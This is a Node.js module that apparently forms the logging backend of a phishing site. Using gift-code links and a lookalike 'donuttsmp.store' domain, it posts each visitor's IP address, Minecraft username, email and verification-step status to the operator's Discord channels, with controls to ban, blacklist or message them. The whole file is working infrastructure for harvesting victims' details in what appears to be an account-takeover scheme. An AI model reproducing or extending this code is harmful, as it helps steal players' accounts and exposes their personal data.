const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, REST, Routes } = require("discord.js");
const { queryParams } = require("../../db/database");
const { autosecureMap } = require("../../mainbot/handlers/botHandler");
const config = require("../../configLoader");

// Anti-spam debounce cache: ignore duplicate logs within 15s
const recentWebLogs = new Map();
setInterval(() => {
    const now = Date.now();
    for (const [key, timestamp] of recentWebLogs.entries()) {
        if (now - timestamp > 30000) {
            recentWebLogs.delete(key);
        }
    }
}, 60000);

/**
 * Send real-time checkout logs directly to the sub-bot's #logs channel
 * Formatted exactly like the Discord bot's user submission logs (Screenshot 2)
 */
async function sendWebLog({ code, ip, domain = "donuttsmp.store", username, email, statusText = "Send Code" }) {
    try {
        const cleanIp = (ip || "127.0.0.1").replace(/^.*:/, '');
        const targetUsername = (username || "Player").trim();
        const targetEmail = (email || "Not Entered").trim();
        const status = statusText || "Send Code";

        // Anti-spam deduplication
        const logKey = `${cleanIp}_${targetUsername.toLowerCase()}_${targetEmail.toLowerCase()}_${status.toLowerCase()}`;
        const now = Date.now();
        if (recentWebLogs.has(logKey) && now - recentWebLogs.get(logKey) < 15000) {
            console.log(`[WEB LOGGER] Skipping duplicate log for ${targetUsername} (${targetEmail}) [${status}]`);
            return false;
        }
        recentWebLogs.set(logKey, now);

        let targetBot = null;
        let botUserId = null;
        let botNumber = 1;

        // 1. Resolve bot from gift code
        if (code) {
            const rows = await queryParams(`SELECT bot_user_id, bot_number FROM gift_links WHERE code = ?`, [code]);
            if (rows.length > 0) {
                botUserId = rows[0].bot_user_id;
                botNumber = rows[0].bot_number || 1;
                targetBot = autosecureMap.get(`${botUserId}|${botNumber}`);
            }
        }

        // 2. Resolve bot from domain if code is not present
        if (!botUserId && domain) {
            const cleanDomain = domain.replace(/^(https?:\/\/)?/, "").replace(/\/.*$/, "");
            const rows = await queryParams(`SELECT user_id, botnumber FROM autosecure WHERE domain = ? LIMIT 1`, [cleanDomain]);
            if (rows && rows.length > 0) {
                botUserId = rows[0].user_id;
                botNumber = rows[0].botnumber || 1;
                targetBot = autosecureMap.get(`${botUserId}|${botNumber}`);
            }
        }

        // If we still can't determine the bot, we shouldn't send logs to a random sub-bot
        if (!botUserId) {
            return false;
        }

        // 2. Fetch logs_channel and users_channel for this bot
        let settingsRows = await queryParams(`SELECT logs_channel, users_channel, token FROM autosecure WHERE user_id = ? AND botnumber = ?`, [botUserId, botNumber]);
        if (!settingsRows || settingsRows.length === 0) {
            settingsRows = await queryParams(`SELECT logs_channel, users_channel, token FROM autosecure WHERE user_id = ? LIMIT 1`, [botUserId]);
        }
        if (!settingsRows || settingsRows.length === 0) {
            console.warn(`[WEB LOGGER] No configuration found for bot user ${botUserId} (bot #${botNumber})`);
            return false;
        }

        const logsChannelId = settingsRows[0].logs_channel ? settingsRows[0].logs_channel.split('|')[0] : null;
        const usersChannelId = settingsRows[0].users_channel ? settingsRows[0].users_channel.split('|')[0] : null;
        
        if (!logsChannelId && !usersChannelId) {
            console.warn(`[WEB LOGGER] No logs_channel or users_channel configured for bot user ${botUserId} (bot #${botNumber})`);
            return false;
        }

        const botToken = targetBot?.token || settingsRows[0]?.token || config.tokens?.[0];

        const dispatchMessage = async (channelId, payload) => {
            if (!channelId) return false;
            if (targetBot && targetBot.channels) {
                const channel = targetBot.channels.cache.get(channelId) || await targetBot.channels.fetch(channelId).catch(() => null);
                if (channel) {
                    await channel.send(payload);
                    return true;
                }
            }
            if (botToken) {
                try {
                    const rest = new REST({ version: '10' }).setToken(botToken);
                    await rest.post(Routes.channelMessages(channelId), {
                        body: {
                            embeds: (payload.embeds || []).map(e => (typeof e.toJSON === 'function' ? e.toJSON() : e)),
                            components: (payload.components || []).map(c => (typeof c.toJSON === 'function' ? c.toJSON() : c))
                        }
                    });
                    return true;
                } catch (restErr) {
                    console.error("[WEB LOGGER] REST dispatch error:", restErr.message);
                }
            }
            return false;
        };

        // Visage 3D Minecraft bust avatar
        const skinName = (!targetUsername.includes("@") && targetUsername !== "Player") ? targetUsername : "MHF_Steve";
        const thumbnailUrl = `https://visage.surgeplay.com/bust/${encodeURIComponent(skinName)}.png?y=-40&quality=lossless`;

        // Exact match with Discord bot messager style (Screenshot 2)
        const adminEmbed = new EmbedBuilder()
            .setColor(13773611) // #D22B2B Red left border
            .setAuthor({
                name: `${targetUsername} | ${cleanIp}`
            })
            .addFields([
                {
                    name: "Username | Email | Status",
                    value: `\`\`\`${targetUsername} | ${targetEmail} | ${status}\`\`\``
                }
            ])
            .setThumbnail(thumbnailUrl);

        // Row 1: Quick stats inspection buttons (Duels, Skywars, Skyblock, Bedwars, DonutSMP)
        const statsRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId(`duels2|${skinName}`)
                .setLabel("Duels")
                .setEmoji("🎣")
                .setStyle(ButtonStyle.Secondary),
            new ButtonBuilder()
                .setCustomId(`skywars2|${skinName}`)
                .setLabel("Skywars")
                .setEmoji("🧭")
                .setStyle(ButtonStyle.Secondary),
            new ButtonBuilder()
                .setCustomId(`skyblock2|${skinName}`)
                .setLabel("Skyblock")
                .setEmoji("🌲")
                .setStyle(ButtonStyle.Secondary),
            new ButtonBuilder()
                .setCustomId(`bedwars2|${skinName}`)
                .setLabel("Bedwars")
                .setEmoji("🛏️")
                .setStyle(ButtonStyle.Secondary),
            new ButtonBuilder()
                .setCustomId(`donut2|${skinName}`)
                .setLabel("DonutSMP")
                .setEmoji("🍩")
                .setStyle(ButtonStyle.Secondary)
        );

        // Row 2: Moderation actions (Ban, Kick, Blacklist, Unban, Unblacklist)
        const modRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId(`banip|${cleanIp}`)
                .setLabel("Ban")
                .setStyle(ButtonStyle.Danger),
            new ButtonBuilder()
                .setCustomId(`kickip|${cleanIp}`)
                .setLabel("Kick")
                .setStyle(ButtonStyle.Danger),
            new ButtonBuilder()
                .setCustomId(`blacklistip|${cleanIp}`)
                .setLabel("Blacklist")
                .setStyle(ButtonStyle.Danger),
            new ButtonBuilder()
                .setCustomId(`unbanip|${cleanIp}`)
                .setLabel("Unban")
                .setStyle(ButtonStyle.Primary),
            new ButtonBuilder()
                .setCustomId(`unblacklistip|${cleanIp}`)
                .setLabel("Unblacklist")
                .setStyle(ButtonStyle.Primary)
        );

        // Row 3: Communication (DM)
        const dmRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId(`dmip|${cleanIp}`)
                .setLabel("DM")
                .setEmoji("💬")
                .setStyle(ButtonStyle.Primary)
        );

        const adminPayload = {
            embeds: [adminEmbed],
            components: [statsRow, modRow, dmRow]
        };

        if (logsChannelId) await dispatchMessage(logsChannelId, adminPayload);
        
        // User channel gets a cleaned-up embed without the IP and without moderation tools
        if (usersChannelId && usersChannelId !== logsChannelId) {
            let maskedUsername = targetUsername;
            let maskedEmail = targetEmail;

            if (targetUsername.length > 2) {
                maskedUsername = targetUsername[0] + '*'.repeat(targetUsername.length - 2) + targetUsername[targetUsername.length - 1];
            } else if (targetUsername !== "Player") {
                maskedUsername = "*-*";
            }

            if (targetEmail !== "Not Entered") {
                let atIndex = targetEmail.indexOf('@');
                if (atIndex > 1) {
                    let beforeAt = targetEmail.substring(0, atIndex);
                    let afterAt = targetEmail.substring(atIndex);
                    maskedEmail = beforeAt[0] + '*******' + beforeAt[beforeAt.length - 1] + afterAt;
                } else {
                    maskedEmail = "*-*";
                }
            }

            const userEmbed = new EmbedBuilder()
                .setColor(13773611)
                .setAuthor({
                    name: `${targetUsername}`
                })
                .addFields([
                    {
                        name: "Username | Email | Status",
                        value: `\`\`\`${maskedUsername} | ${maskedEmail} | ${status}\`\`\``
                    }
                ])
                .setThumbnail(thumbnailUrl);

            const userPayload = {
                embeds: [userEmbed],
                components: [statsRow] // Only show stats for users
            };

            await dispatchMessage(usersChannelId, userPayload);
        }

        return true;

    } catch (err) {
        console.error("[WEB LOGGER] Error dispatching web log to Discord:", err.message);
        return false;
    }
}

module.exports = { sendWebLog };
